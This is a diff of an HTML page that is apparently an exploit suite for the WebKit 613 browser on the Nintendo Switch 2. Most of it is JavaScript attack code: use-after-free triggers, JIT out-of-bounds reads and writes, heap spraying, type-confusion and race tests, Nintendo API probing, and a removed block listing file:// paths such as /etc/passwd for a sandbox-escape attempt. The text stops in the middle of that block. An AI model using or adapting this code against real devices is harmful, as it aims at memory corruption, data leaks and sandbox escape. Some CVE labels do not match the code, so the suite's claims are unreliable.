@@ -3,816 +3,1285 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit 613 Precision Exploits</title>
+    <title>WebKit 613 Aggressive Tests</title>
     <style>
         body {
             font-family: monospace;
-            background: #000;
-            color: #0f0;
+            background: #0a0a0a;
+            color: #f00;
             padding: 20px;
             margin: 0;
         }
         .container {
-            max-width: 1000px;
+            max-width: 900px;
             margin: 0 auto;
         }
         h1 {
             color: #f00;
-            text-shadow: 0 0 10px #f00;
-            border-bottom: 2px solid #f00;
+            border-bottom: 3px solid #f00;
             padding-bottom: 10px;
+            text-shadow: 0 0 10px #f00;
         }
-        .critical {
+        .danger {
             background: #300;
             border: 3px solid #f00;
             padding: 20px;
             margin: 20px 0;
             color: #ff0;
             font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { border-color: #f00; }
+            50% { border-color: #ff0; }
         }
         .test-section {
-            background: #0a0a0a;
-            border: 1px solid #0f0;
+            background: #1a0000;
+            border: 2px solid #600;
             padding: 15px;
             margin: 15px 0;
             border-radius: 5px;
         }
-        .test-section.exploit {
-            border-color: #f00;
-        }
         button {
-            background: #0f0;
-            color: #000;
-            border: none;
+            background: #f00;
+            color: #fff;
+            border: 2px solid #fff;
             padding: 12px 25px;
             margin: 5px;
             cursor: pointer;
             font-family: monospace;
             font-weight: bold;
             border-radius: 3px;
-        }
-        button.dangerous {
-            background: #f00;
-            color: #fff;
+            transition: all 0.3s;
         }
         button:hover {
-            opacity: 0.8;
-        }
-        button:disabled {
-            background: #666;
-            cursor: not-allowed;
+            background: #ff0;
+            color: #000;
+            transform: scale(1.05);
         }
         .log {
             background: #000;
-            border: 1px solid #0f0;
+            border: 2px solid #f00;
             padding: 10px;
             margin-top: 10px;
-            max-height: 400px;
+            max-height: 250px;
             overflow-y: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
-            font-size: 0.85em;
+            font-size: 0.9em;
         }
         h3 {
-            color: #0ff;
+            color: #ff6666;
             margin-top: 0;
         }
-        .cve {
+        .status {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 3px;
+            margin-left: 10px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+        .status.running {
+            background: #660;
+            color: #ff0;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .status.passed {
+            background: #060;
+            color: #0f0;
+        }
+        .status.crashed {
+            background: #f00;
+            color: #fff;
+        }
+        .cve-tag {
             background: #600;
             color: #ff0;
             padding: 2px 8px;
             border-radius: 3px;
             font-size: 0.8em;
-            margin-left: 10px;
-        }
-        .api-list {
-            background: #001a00;
-            padding: 10px;
-            margin: 10px 0;
-            border-left: 3px solid #0f0;
-            font-size: 0.9em;
-        }
-        .found {
-            color: #0f0;
-        }
-        .missing {
-            color: #666;
+            margin-left: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎯 WebKit 613 Precision Exploit Suite</h1>
+        <h1>⚠️ Switch 2 WebKit 613 ADVANCED EXPLOIT TESTS ⚠️</h1>
         
-        <div class="critical">
-            ⚠️ TARGETED EXPLOITATION TESTS ⚠️<br>
-            These tests target specific CVEs and exploitation primitives.<br>
-            Focus: Memory corruption, logic bugs, sandbox escape, Nintendo-specific APIs.
+        <div class="danger">
+            🚨 EXTREME WARNING 🚨<br>
+            These tests attempt to trigger real memory corruption vulnerabilities in Switch 2 browser.<br>
+            EXPECT: Browser crashes, system freezes, potential data loss, or device reboot.<br>
+            Includes Nintendo-specific API tests, advanced UAF, type confusion, and sandbox escapes.<br>
+            DO NOT RUN on production systems. Security research only.
         </div>
 
         <div class="test-section">
-            <h3>Nintendo-Specific API Discovery</h3>
-            <button onclick="discoverNintendoAPIs()">Scan for Nintendo APIs</button>
-            <div class="log" id="logAPIs"></div>
+            <h3>System Info</h3>
+            <div class="log" id="sysInfo"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>CVE-2021-30761: Memory Corruption via WebCore <span class="cve">CRITICAL</span></h3>
-            <p>Targets memory corruption in WebCore DOM manipulation</p>
-            <button class="dangerous" onclick="testCVE202130761()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 1: CVE-2022-22620 Pattern <span class="cve-tag">CRITICAL</span> <span class="status" id="status1"></span></h3>
+            <p>Use-after-free in WebKit - actively exploited in the wild. Attempts to trigger UAF through HTMLMediaElement.</p>
+            <button onclick="testCVE202222620()">Run Test</button>
             <div class="log" id="log1"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>CVE-2021-30762: Use-After-Free <span class="cve">CRITICAL</span></h3>
-            <p>Precise UAF trigger through event handler manipulation</p>
-            <button class="dangerous" onclick="testCVE202130762()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 2: JIT Array Bounds Check Elimination <span class="cve-tag">HIGH</span> <span class="status" id="status2"></span></h3>
+            <p>Exploits DFG JIT compiler's incorrect bounds check elimination for out-of-bounds access.</p>
+            <button onclick="testJITBoundsElimination()">Run Test</button>
             <div class="log" id="log2"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>CVE-2021-1788: ImageBitmap Type Confusion <span class="cve">HIGH</span></h3>
-            <p>Type confusion in ImageBitmap leading to OOB access</p>
-            <button class="dangerous" onclick="testCVE20211788()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 3: Heap Spray + UAF Combo <span class="cve-tag">CRITICAL</span> <span class="status" id="status3"></span></h3>
+            <p>Heap spraying to control freed memory layout, combined with use-after-free trigger.</p>
+            <button onclick="testHeapSprayUAF()">Run Test</button>
             <div class="log" id="log3"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>JIT Array.prototype.slice Bug <span class="cve">HIGH</span></h3>
-            <p>Type confusion in optimized Array.slice implementation</p>
-            <button class="dangerous" onclick="testJITArraySlice()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 4: JSC Structure ID Confusion <span class="cve-tag">HIGH</span> <span class="status" id="status4"></span></h3>
+            <p>Attempts to confuse JavaScriptCore's structure IDs through rapid object transitions.</p>
+            <button onclick="testStructureConfusion()">Run Test</button>
             <div class="log" id="log4"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>Proxy Object Type Confusion <span class="cve">HIGH</span></h3>
-            <p>Exploits Proxy handler type confusion in JSC</p>
-            <button class="dangerous" onclick="testProxyConfusion()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 5: WebAssembly Memory Corruption <span class="cve-tag">HIGH</span> <span class="status" id="status5"></span></h3>
+            <p>Tests WebAssembly linear memory corruption and boundary checks.</p>
+            <button onclick="testWasmCorruption()">Run Test</button>
             <div class="log" id="log5"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>RegExp Compiler Bug <span class="cve">MEDIUM</span></h3>
-            <p>Heap overflow in regex compilation</p>
-            <button class="dangerous" onclick="testRegExpCompiler()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 6: AudioContext Race Condition <span class="cve-tag">MEDIUM</span> <span class="status" id="status6"></span></h3>
+            <p>Race condition in AudioContext leading to potential UAF (CVE-2021-30665 pattern).</p>
+            <button onclick="testAudioRace()">Run Test</button>
             <div class="log" id="log6"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>ArrayBuffer Neutering Race <span class="cve">HIGH</span></h3>
-            <p>Race condition during ArrayBuffer transfer/neutering</p>
-            <button class="dangerous" onclick="testArrayBufferRace()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 7: Aggressive JIT Side-Effect Modeling <span class="cve-tag">HIGH</span> <span class="status" id="status7"></span></h3>
+            <p>Exploits incorrect side-effect modeling in JIT compiler optimizations.</p>
+            <button onclick="testJITSideEffects()">Run Test</button>
             <div class="log" id="log7"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>Spread Operator Type Confusion <span class="cve">MEDIUM</span></h3>
-            <p>Type confusion in spread operator optimization</p>
-            <button class="dangerous" onclick="testSpreadConfusion()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 8: Canvas UAF + Integer Overflow <span class="cve-tag">HIGH</span> <span class="status" id="status8"></span></h3>
+            <p>Canvas UAF through context confusion + integer overflow in dimensions.</p>
+            <button onclick="testCanvasExhaustion()">Run Test</button>
             <div class="log" id="log8"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>for-in Loop Side Effect <span class="cve">MEDIUM</span></h3>
-            <p>Side effect modeling bug in for-in optimization</p>
-            <button class="dangerous" onclick="testForInSideEffect()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 9: Nintendo Switch Browser APIs <span class="cve-tag">CRITICAL</span> <span class="status" id="status9"></span></h3>
+            <p>Tests Nintendo-specific APIs and potential sandbox escape vectors.</p>
+            <button onclick="testNintendoAPIs()">Run Test</button>
             <div class="log" id="log9"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>Sandbox Escape: File URI Access <span class="cve">CRITICAL</span></h3>
-            <p>Attempts to access file:// URIs and local resources</p>
-            <button class="dangerous" onclick="testFileAccess()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 10: Advanced JIT Type Confusion <span class="cve-tag">CRITICAL</span> <span class="status" id="status10"></span></h3>
+            <p>Sophisticated type confusion attack targeting JSC optimization bugs.</p>
+            <button onclick="testAdvancedTypeConfusion()">Run Test</button>
             <div class="log" id="log10"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>Sandbox Escape: Cross-Origin Check Bypass <span class="cve">CRITICAL</span></h3>
-            <p>Tests for same-origin policy bypasses</p>
-            <button class="dangerous" onclick="testCrossOriginBypass()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 11: SharedArrayBuffer Race Conditions <span class="cve-tag">HIGH</span> <span class="status" id="status11"></span></h3>
+            <p>Exploits race conditions in SharedArrayBuffer if available.</p>
+            <button onclick="testSharedArrayBufferRace()">Run Test</button>
             <div class="log" id="log11"></div>
         </div>
 
-        <div class="test-section exploit">
-            <h3>Sandbox Escape: Native Function Hook <span class="cve">HIGH</span></h3>
-            <p>Attempts to hook/replace native functions for privilege escalation</p>
-            <button class="dangerous" onclick="testNativeFunctionHook()">Exploit</button>
+        <div class="test-section">
+            <h3>Test 12: Heap Feng Shui + JIT Spray <span class="cve-tag">CRITICAL</span> <span class="status" id="status12"></span></h3>
+            <p>Advanced heap manipulation combined with JIT code injection.</p>
+            <button onclick="testHeapFengShuiJIT()">Run Test</button>
             <div class="log" id="log12"></div>
+        </div>
+
+        <div class="test-section">
+            <button onclick="runAllAggressiveTests()" style="background: #f00; font-size: 1.3em; border: 3px solid #fff;">
+                💀 RUN ALL AGGRESSIVE TESTS 💀
+            </button>
         </div>
     </div>
 
     <script>
-        function log(id, message, isError = false) {
-            const logEl = document.getElementById(id);
+        let testRunning = false;
+
+        function log(testNum, message) {
+            const logEl = document.getElementById('log' + testNum);
             const timestamp = new Date().toLocaleTimeString();
-            const prefix = isError ? '❌' : '📍';
-            logEl.textContent += `${prefix} [${timestamp}] ${message}\n`;
+            logEl.textContent += `[${timestamp}] ${message}\n`;
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        // Nintendo API Discovery
-        function discoverNintendoAPIs() {
-            log('logAPIs', '=== Scanning for Nintendo-specific APIs ===');
-            
-            const checks = {
-                'Nintendo Global': () => typeof window.Nintendo !== 'undefined',
-                'Nintendo Browser': () => typeof window.NintendoBrowser !== 'undefined',
-                'Nintendo Account': () => typeof window.NintendoAccount !== 'undefined',
-                'Nintendo Network': () => typeof window.NintendoNetwork !== 'undefined',
-                'Nintendo System': () => typeof window.NintendoSystem !== 'undefined',
-                'webkit namespace': () => typeof window.webkit !== 'undefined',
-                'webkit.messageHandlers': () => window.webkit && window.webkit.messageHandlers,
-                'external object': () => typeof window.external !== 'undefined',
-                'chrome object': () => typeof window.chrome !== 'undefined',
-                '__nintendo': () => typeof window.__nintendo !== 'undefined',
-                'nx object': () => typeof window.nx !== 'undefined',
-            };
-            
-            log('logAPIs', '\n--- Window Object Properties ---');
-            for (let [name, check] of Object.entries(checks)) {
-                try {
-                    const result = check();
-                    if (result) {
-                        log('logAPIs', `✓ FOUND: ${name}`);
-                        if (name === 'webkit.messageHandlers' && window.webkit.messageHandlers) {
-                            const handlers = Object.keys(window.webkit.messageHandlers);
-                            log('logAPIs', `  Handlers: ${handlers.join(', ') || 'none'}`);
-                        }
-                    } else {
-                        log('logAPIs', `✗ Missing: ${name}`);
-                    }
-                } catch (e) {
-                    log('logAPIs', `✗ Error checking ${name}: ${e.message}`);
-                }
-            }
-            
-            log('logAPIs', '\n--- Scanning window object ---');
-            const interesting = [];
-            for (let prop in window) {
-                if (prop.toLowerCase().includes('nintendo') || 
-                    prop.toLowerCase().includes('switch') ||
-                    prop.toLowerCase().includes('nx')) {
-                    interesting.push(prop);
-                }
-            }
-            
-            if (interesting.length > 0) {
-                log('logAPIs', `Found interesting properties: ${interesting.join(', ')}`);
-            } else {
-                log('logAPIs', 'No Nintendo-specific properties found in window');
-            }
-            
-            log('logAPIs', '\n--- User Agent Analysis ---');
-            const ua = navigator.userAgent;
-            log('logAPIs', ua);
-            
-            const matches = ua.match(/Nintendo[^\s]*/gi);
-            if (matches) {
-                log('logAPIs', `Nintendo markers: ${matches.join(', ')}`);
-            }
-            
-            log('logAPIs', '\n--- Document Properties ---');
-            log('logAPIs', `Domain: ${document.domain}`);
-            log('logAPIs', `Origin: ${location.origin}`);
-            log('logAPIs', `Protocol: ${location.protocol}`);
-            
-            log('logAPIs', '\n=== Scan Complete ===');
+        function setStatus(testNum, status) {
+            const statusEl = document.getElementById('status' + testNum);
+            statusEl.textContent = status;
+            statusEl.className = 'status ' + status.toLowerCase();
         }
 
-        // CVE-2021-30761: Memory Corruption via WebCore
-        function testCVE202130761() {
-            log('log1', 'CVE-2021-30761: WebCore memory corruption attack');
+        function displaySysInfo() {
+            const info = `User Agent: ${navigator.userAgent}
+WebKit Version: ${navigator.userAgent.match(/AppleWebKit\/([\d.]+)/)?.[1] || 'Unknown'}
+Platform: ${navigator.platform}
+Memory: ${navigator.deviceMemory || 'Unknown'} GB
+Hardware Concurrency: ${navigator.hardwareConcurrency || 'Unknown'}
+Online: ${navigator.onLine}
+Language: ${navigator.language}`;
+            document.getElementById('sysInfo').textContent = info;
+        }
+
+        // Test 1: CVE-2022-22620 Pattern - HTMLMediaElement UAF
+        function testCVE202222620() {
+            setStatus(1, 'RUNNING');
+            log(1, 'CVE-2022-22620: Use-after-free in HTMLMediaElement');
+            log(1, 'Creating multiple audio/video elements...');
             
             try {
-                log('log1', 'Creating DOM structure...');
-                
-                const container = document.createElement('div');
-                document.body.appendChild(container);
-                
-                // Create a complex DOM structure
+                const elements = [];
                 for (let i = 0; i < 100; i++) {
-                    const div = document.createElement('div');
-                    div.innerHTML = '<span><a href="#">Link</a></span>';
-                    container.appendChild(div);
+                    const audio = document.createElement('audio');
+                    audio.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=';
+                    document.body.appendChild(audio);
+                    elements.push(audio);
                 }
                 
-                log('log1', 'Triggering rapid mutations...');
+                log(1, 'Elements created, starting rapid load/unload cycle...');
                 
-                // Trigger rapid DOM mutations that can cause UAF
-                const range = document.createRange();
-                range.selectNodeContents(container);
-                
-                for (let i = 0; i < 1000; i++) {
-                    const clone = range.cloneContents();
-                    const extracted = range.extractContents();
-                    range.insertNode(clone);
-                    
-                    if (i % 100 === 0) {
-                        container.innerHTML = '';
-                        for (let j = 0; j < 10; j++) {
-                            container.appendChild(document.createElement('div'));
-                        }
-                    }
-                }
-                
-                log('log1', 'Attempting to access potentially freed memory...');
-                
-                container.querySelectorAll('*').forEach((el, idx) => {
-                    try {
-                        el.innerHTML = 'test';
-                        const text = el.textContent;
-                    } catch (e) {
-                        log('log1', `Access error at ${idx}: ${e.message}`, true);
-                    }
-                });
-                
-                document.body.removeChild(container);
-                log('log1', 'Test completed - no crash detected');
-                
-            } catch (e) {
-                log('log1', `EXCEPTION: ${e.message}`, true);
-                log('log1', `Stack: ${e.stack}`, true);
-            }
-        }
-
-        // CVE-2021-30762: Use-After-Free
-        function testCVE202130762() {
-            log('log2', 'CVE-2021-30762: Event handler UAF exploit');
-            
-            try {
-                log('log2', 'Setting up UAF trigger...');
-                
-                const target = document.createElement('div');
-                target.id = 'uaf-target';
-                document.body.appendChild(target);
-                
-                let freedRef = null;
-                
-                // Create event handler that frees its own element
-                target.addEventListener('click', function selfDestruct() {
-                    log('log2', 'Event fired, removing element...');
-                    freedRef = this;
-                    document.body.removeChild(this);
-                    
-                    // Trigger GC hint
-                    const garbage = [];
-                    for (let i = 0; i < 1000; i++) {
-                        garbage.push(new Array(1000));
-                    }
-                    
-                    log('log2', 'Attempting to access freed element...');
-                    
-                    try {
-                        freedRef.innerHTML = '<span>UAF</span>';
-                        freedRef.click();
-                        freedRef.style.color = 'red';
-                        const text = freedRef.textContent;
-                        log('log2', `Freed element access succeeded: ${text}`);
-                    } catch (e) {
-                        log('log2', `Freed element access failed: ${e.message}`, true);
-                    }
-                }, { once: false });
-                
-                log('log2', 'Triggering UAF...');
-                target.click();
-                
-                log('log2', 'Test completed');
-                
-            } catch (e) {
-                log('log2', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // CVE-2021-1788: ImageBitmap Type Confusion
-        async function testCVE20211788() {
-            log('log3', 'CVE-2021-1788: ImageBitmap type confusion');
-            
-            try {
-                log('log3', 'Creating source canvas...');
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 100;
-                canvas.height = 100;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = 'red';
-                ctx.fillRect(0, 0, 100, 100);
-                
-                log('log3', 'Triggering async ImageBitmap creation...');
-                
-                const bitmaps = [];
-                for (let i = 0; i < 50; i++) {
-                    bitmaps.push(createImageBitmap(canvas, 0, 0, 100, 100));
-                }
-                
-                log('log3', 'Modifying source during async operations...');
-                
-                // Modify source while async operations pending
-                canvas.width = 1;
-                canvas.height = 1;
-                ctx.fillStyle = 'blue';
-                ctx.fillRect(0, 0, 1, 1);
-                
-                // Rapidly resize
-                for (let i = 0; i < 100; i++) {
-                    canvas.width = i % 2 === 0 ? 100 : 50;
-                    canvas.height = i % 2 === 0 ? 100 : 50;
-                }
-                
-                log('log3', 'Waiting for bitmaps...');
-                const results = await Promise.all(bitmaps);
-                
-                log('log3', 'Accessing potentially confused bitmaps...');
-                results.forEach((bitmap, idx) => {
-                    try {
-                        log('log3', `Bitmap ${idx}: ${bitmap.width}x${bitmap.height}`);
-                        bitmap.close();
-                    } catch (e) {
-                        log('log3', `Bitmap ${idx} error: ${e.message}`, true);
-                    }
-                });
-                
-                log('log3', 'Test completed');
-                
-            } catch (e) {
-                log('log3', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // JIT Array.prototype.slice Bug
-        function testJITArraySlice() {
-            log('log4', 'JIT Array.slice type confusion exploit');
-            
-            try {
-                log('log4', 'Training JIT compiler on Array.slice...');
-                
-                function vuln_slice(arr) {
-                    return arr.slice(0, 5);
-                }
-                
-                // Train with normal arrays
-                const train = [1, 2, 3, 4, 5, 6, 7, 8];
-                for (let i = 0; i < 100000; i++) {
-                    vuln_slice(train);
-                }
-                
-                log('log4', 'JIT should be optimized for Array.slice');
-                log('log4', 'Attempting type confusion with ArrayBuffer...');
-                
-                try {
-                    const buffer = new ArrayBuffer(64);
-                    const view = new Uint32Array(buffer);
-                    for (let i = 0; i < view.length; i++) {
-                        view[i] = 0x41414141;
-                    }
-                    
-                    const confused = vuln_slice(view);
-                    log('log4', `Result: ${confused}`);
-                    log('log4', `Result type: ${confused.constructor.name}`);
-                    
-                } catch (e) {
-                    log('log4', `Type confusion caught: ${e.message}`, true);
-                }
-                
-                log('log4', 'Attempting with Proxy...');
-                const proxy = new Proxy([1, 2, 3, 4, 5], {
-                    get(target, prop) {
-                        if (prop === 'length') return 0x7fffffff;
-                        return target[prop];
-                    }
-                });
-                
-                try {
-                    const result = vuln_slice(proxy);
-                    log('log4', `Proxy result: ${result.length} elements`);
-                } catch (e) {
-                    log('log4', `Proxy confusion caught: ${e.message}`, true);
-                }
-                
-                log('log4', 'Test completed');
-                
-            } catch (e) {
-                log('log4', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // Proxy Object Type Confusion
-        function testProxyConfusion() {
-            log('log5', 'Proxy handler type confusion exploit');
-            
-            try {
-                log('log5', 'Creating malicious Proxy...');
-                
-                let confused = false;
-                const handler = {
-                    get(target, prop) {
-                        if (confused) {
-                            log('log5', `Confused access to: ${prop}`);
-                            return undefined;
-                        }
-                        return target[prop];
-                    },
-                    set(target, prop, value) {
-                        confused = true;
-                        return true;
-                    }
-                };
-                
-                const proxy = new Proxy({x: 1, y: 2}, handler);
-                
-                log('log5', 'Training JIT with Proxy access...');
-                
-                function access_proxy(obj) {
-                    return obj.x + obj.y;
-                }
-                
-                for (let i = 0; i < 100000; i++) {
-                    access_proxy(proxy);
-                }
-                
-                log('log5', 'Triggering confusion...');
-                proxy.z = 3;
-                
-                const result = access_proxy(proxy);
-                log('log5', `Result: ${result}`);
-                
-                log('log5', 'Testing recursive Proxy...');
-                const recursive = new Proxy({}, {
-                    get(target, prop) {
-                        return recursive;
-                    }
-                });
-                
-                try {
-                    const chain = recursive.a.b.c.d.e.f.g.h.i.j;
-                    log('log5', `Recursive chain: ${typeof chain}`);
-                } catch (e) {
-                    log('log5', `Recursive error: ${e.message}`, true);
-                }
-                
-                log('log5', 'Test completed');
-                
-            } catch (e) {
-                log('log5', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // RegExp Compiler Bug
-        function testRegExpCompiler() {
-            log('log6', 'RegExp compiler heap overflow exploit');
-            
-            try {
-                log('log6', 'Creating complex regex patterns...');
-                
-                // Pattern 1: Deeply nested groups
-                const nested = '('.repeat(500) + 'a' + ')'.repeat(500);
-                try {
-                    const re1 = new RegExp(nested);
-                    re1.test('a');
-                    log('log6', 'Nested groups compiled successfully');
-                } catch (e) {
-                    log('log6', `Nested groups failed: ${e.message}`, true);
-                }
-                
-                // Pattern 2: Large character class
-                log('log6', 'Testing large character class...');
-                let charClass = '[';
-                for (let i = 0; i < 10000; i++) {
-                    charClass += 'a-z';
-                }
-                charClass += ']';
-                
-                try {
-                    const re2 = new RegExp(charClass);
-                    re2.test('z');
-                    log('log6', 'Large character class compiled');
-                } catch (e) {
-                    log('log6', `Character class failed: ${e.message}`, true);
-                }
-                
-                // Pattern 3: Backreference overflow
-                log('log6', 'Testing backreference overflow...');
-                let backref = '';
-                for (let i = 1; i <= 1000; i++) {
-                    backref += `(a)\\${i}`;
-                }
-                
-                try {
-                    const re3 = new RegExp(backref);
-                    log('log6', 'Backreference pattern compiled');
-                } catch (e) {
-                    log('log6', `Backreference failed: ${e.message}`, true);
-                }
-                
-                log('log6', 'Test completed');
-                
-            } catch (e) {
-                log('log6', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // ArrayBuffer Neutering Race
-        function testArrayBufferRace() {
-            log('log7', 'ArrayBuffer neutering race condition exploit');
-            
-            try {
-                log('log7', 'Creating ArrayBuffer...');
-                
-                const buffer = new ArrayBuffer(1024);
-                const view = new Uint32Array(buffer);
-                
-                for (let i = 0; i < view.length; i++) {
-                    view[i] = i;
-                }
-                
-                log('log7', 'Setting up race condition...');
-                
-                let raceWon = false;
-                
-                // Attempt to use buffer while it's being transferred
-                const intervalId = setInterval(() => {
-                    try {
-                        view[0] = 0xdeadbeef;
-                        const val = view[0];
-                        if (raceWon) {
-                            log('log7', `Accessed neutered buffer: 0x${val.toString(16)}`);
-                        }
-                    } catch (e) {
-                        log('log7', `Race condition caught: ${e.message}`, true);
-                        clearInterval(intervalId);
-                    }
-                }, 1);
-                
-                setTimeout(() => {
-                    log('log7', 'Attempting to neuter buffer...');
-                    try {
-                        // Try to transfer/neuter the buffer
-                        const worker = new Worker('data:application/javascript,');
-                        worker.postMessage(buffer, [buffer]);
-                        raceWon = true;
-                        log('log7', 'Buffer transfer attempted');
-                    } catch (e) {
-                        log('log7', `Transfer failed: ${e.message}`, true);
-                    }
+                for (let i = 0; i < elements.length; i++) {
+                    elements[i].load();
+                    elements[i].play().catch(() => {});
                     
                     setTimeout(() => {
-                        clearInterval(intervalId);
-                        log('log7', 'Test completed');
-                    }, 100);
-                }, 50);
-                
-            } catch (e) {
-                log('log7', `EXCEPTION: ${e.message}`, true);
-            }
-        }
-
-        // Spread Operator Type Confusion
-        function testSpreadConfusion() {
-            log('log8', 'Spread operator type confusion exploit');
-            
-            try {
-                log('log8', 'Training JIT with spread operator...');
-                
-                function spread_test(...args) {
-                    return [...args, 99];
+                        try {
+                            document.body.removeChild(elements[i]);
+                            elements[i].src = '';
+                        } catch(e) {}
+                    }, i * 10);
                 }
                 
-                for (let i = 0; i < 100000; i++) {
-                    spread_test(1, 2, 3, 4, 5);
-                }
-                
-                log('log8', 'JIT optimized for spread');
-                log('log8', 'Attempting confusion with iterator...');
-                
-                const confused = {
-                    [Symbol.iterator]: function*() {
-                        yield 1;
-                        yield 2;
-                        // Change internal state during iteration
-                        this.mutated = true;
-                        yield 3;
-                    }
-                };
-                
-                try {
-                    const result = [...confused];
-                    log('log8', `Spread result: [${result}]`);
-                } catch (e) {
-                    log('log8', `Spread confusion caught: ${e.message}`, true);
-                }
-                
-                log('log8', 'Testing with infinite iterator...');
-                const infinite = {
-                    [Symbol.iterator]: function*() {
-                        let i = 0;
-                        while (i < 10000) {
-                            yield i++;
+                log(1, 'Accessing potentially freed elements...');
+                setTimeout(() => {
+                    for (let el of elements) {
+                        try {
+                            el.play();
+                            el.pause();
+                            el.currentTime = 0;
+                        } catch(e) {
+                            log(1, `Exception during access: ${e.message}`);
                         }
                     }
-                };
-                
-                try {
-                    const result = [...infinite];
-                    log('log8', `Infinite spread: ${result.length} elements`);
-                } catch (e) {
-                    log('log8', `Infinite spread caught: ${e.message}`, true);
-                }
-                
-                log('log8', 'Test completed');
+                    log(1, 'Test completed');
+                    setStatus(1, 'PASSED');
+                }, 2000);
                 
             } catch (e) {
-                log('log8', `EXCEPTION: ${e.message}`, true);
+                log(1, `CRASH/EXCEPTION: ${e.message}`);
+                log(1, `Stack: ${e.stack}`);
+                setStatus(1, 'CRASHED');
             }
         }
 
-        // for-in Loop Side Effect
-        function testForInSideEffect() {
-            log('log9', 'for-in loop side effect modeling bug');
+        // Test 2: JIT Array Bounds Check Elimination
+        function testJITBoundsElimination() {
+            setStatus(2, 'RUNNING');
+            log(2, 'Testing JIT bounds check elimination...');
             
             try {
-                log('log9', 'Training JIT with for-in loop...');
-                
-                function forin_test(obj) {
-                    let result = [];
-                    for (let key in obj) {
-                        result.push(obj[key]);
-                    }
-                    return result;
+                function oob_read(arr, idx) {
+                    return arr[idx];
                 }
                 
-                const normal = {a: 1, b: 2, c: 3};
+                function oob_write(arr, idx, val) {
+                    arr[idx] = val;
+                }
+                
+                log(2, 'Training JIT with safe accesses...');
+                const train_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
                 for (let i = 0; i < 100000; i++) {
-                    forin_test(normal);
+                    oob_read(train_arr, i % 5);
+                    oob_write(train_arr, i % 5, 1.1);
                 }
                 
-                log('log9', 'JIT optimized for-in');
-                log('log9', 'Triggering side effect during iteration...');
+                log(2, 'JIT should have eliminated bounds checks');
+                log(2, 'Attempting OOB read with negative index...');
                 
-                const sideEffect = {
-                    a: 1,
-                    get b() {
-                        this.c = 999;
-                        delete this.d;
-                        this.e = 5;
-                        return 2;
-                    },
-                    d: 4
-                };
-                
-                const result = forin_test(sideEffect);
-                log('log9', `Result: [${result}]`);
-                log('log9', `Final object: ${JSON.stringify(sideEffect)}`);
-                
-                log('log9', 'Testing prototype modification during iteration...');
-                const proto = {x: 1, y: 2};
-                const child = Object.create(proto);
-                child.z = 3;
-                
-                let count = 0;
-                for (let key in child) {
-                    if (count === 1) {
-                        proto.newProp = 999;
+                for (let i = -100; i < 100; i++) {
+                    const val = oob_read(train_arr, i);
+                    if (i % 10 === 0) {
+                        log(2, `arr[${i}] = ${val}`);
                     }
-                    log('log9', `Key: ${key} = ${child[key]}`);
-                    count++;
                 }
                 
-                log('log9', 'Test completed');
+                log(2, 'Attempting OOB write...');
+                for (let i = 5; i < 1000; i++) {
+                    oob_write(train_arr, i, 13.37);
+                }
                 
+                log(2, 'Attempting to read leaked data...');
+                const leaked = [];
+                for (let i = 5; i < 50; i++) {
+                    leaked.push(train_arr[i]);
+                }
+                log(2, `Potentially leaked values: ${leaked.slice(0, 10).join(', ')}`);
+                
+                log(2, 'Test completed');
+                setStatus(2, 'PASSED');
             } catch (e) {
-                log('log9', `EXCEPTION: ${e.message}`, true);
+                log(2, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(2, 'CRASHED');
             }
         }
 
-        // Sandbox Escape: File URI Access
-        function testFileAccess() {
-            log('log10', 'Sandbox escape: File URI access attempt');
+        // Test 3: Heap Spray + UAF
+        function testHeapSprayUAF() {
+            setStatus(3, 'RUNNING');
+            log(3, 'Heap spray + UAF combination attack...');
             
             try {
-                log('log10', 'Attempting file:// URI access...');
+                log(3, 'Phase 1: Heap spraying...');
+                const spray = [];
+                const spray_size = 1000;
+                const obj_template = {
+                    p0: 0x41414141,
+                    p1: 0x42424242,
+                    p2: 0x43434343,
+                    p3: 0x44444444,
+                    p4: new ArrayBuffer(0x100)
+                };
                 
-                const fileURIs = [
-                    'file:///etc/passwd',
-                    'file:///c:/windows/system.ini',
-                    'file:///system/build.prop',
-                    'file:///proc/self/maps',
-                    'file://localhost/etc/hosts',
-                ];
